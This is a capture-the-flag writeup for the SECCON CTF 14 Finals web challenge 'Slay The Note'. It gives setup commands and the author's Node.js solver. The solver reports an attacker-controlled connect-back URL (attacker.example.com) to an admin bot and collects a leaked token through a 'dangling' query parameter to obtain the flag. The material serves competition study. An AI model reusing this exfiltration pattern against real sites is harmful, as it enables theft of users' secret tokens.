---
title: "Slay The Note - SECCON CTF 14 Finals 2026"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "slay", "note", "web", "seccon-ctf-14-finals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/slay-the-note"
license: "none stated"
ctf:
  name: "SECCON CTF 14 Finals"
  year: 2026
  challenge: "Slay The Note"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/slay-the-note>
- **CTF:** SECCON CTF 14 Finals 2026

---

# [web] Slay the Note

## Description

🐍 Snecko Eye 👁

- Challenge: `http://slay-the-note.{int,dom}.seccon.games:3000`
- Admin bot: `http://slay-the-note.{int,dom}.seccon.games:1337`

## Attachments

- [slay-the-note](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202603_SECCON_CTF_14_Finals/web/slay-the-note/solution/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";
import fs from "node:fs";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());
const verify = (token) =>
  fetch(`${BOT_BASE_URL}/api/verify`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ token }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  reply.type("text/html; charset=utf-8").send(fs.readFileSync("index.html"));
});

app.get("/leak", async (req, reply) => {
  const { dangling } = req.query;
  const token = dangling.match(/TOKEN_[0-9a-f]+/)[0];
  console.log({ dangling, token });

  const flag = await verify(token);
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);
  await reportUrl(CONNECTBACK_URL);
  assert.fail("Failed");
});
```
